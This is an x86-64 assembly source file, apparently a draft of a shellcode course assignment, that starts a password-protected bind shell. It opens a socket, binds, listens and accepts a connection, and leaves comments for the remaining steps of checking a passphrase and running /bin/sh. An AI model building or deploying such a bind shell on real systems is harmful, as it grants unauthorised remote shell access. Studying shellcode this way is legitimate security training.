global _start

_start:
	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	xor rdx, rdx

	;create socket
	add rax, 41
	add dil, 2
	inc sil
	syscall
	
	mov rdi, rax ; or
	push rax ;stack now has return value or server fd
	
	;create structure
	push word 0xf27
	push word 0x02

	;create bind
	xor rax, rax
	add rax, 49
	mov rsi, rsp
	mov rdx, 16
	syscall

	;create listen
	xor rax, rax
	add rax, 50
	xor rsi, rsi
	add rsi, 2
	syscall

	;create accept
	xor rax, rax
	add rax, 43
	xor rsi, rsi
	xor rdx, rdx
	syscall

	mov rbx, rax ; store client fd in rbx
	
	;send pass prompt to client

	;recv from client the passphrase

	;compare passphrase with password

	;fork to child - detach main

	;Execute /bin/sh in child


section .data:
	enter_password: db 'Enter the PassPhrase for Shell Server', 0xa
	password: db 'slae64assign1'
